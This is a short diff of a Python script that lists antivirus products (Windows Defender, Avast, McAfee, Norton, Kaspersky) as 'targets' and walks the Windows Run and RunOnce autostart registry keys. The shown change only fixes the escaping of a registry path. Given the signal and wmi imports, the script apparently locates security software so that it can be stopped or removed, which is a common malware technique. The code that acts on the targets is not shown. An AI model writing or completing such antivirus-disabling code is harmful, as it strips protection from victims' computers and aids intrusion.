@@ -3,7 +3,7 @@ import winreg, wmi, os, signal
 targets = ["Windows Defender", "Avast", "McAfee", "Norton", "Kaspersky"]
 
 hives = [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER] 
-paths = ["SOFTWARE\Microsoft\Windows\\CurrentVersion\Run", "SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"]
+paths = ["SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"]
 
 for hive in hives:
     for path in paths:
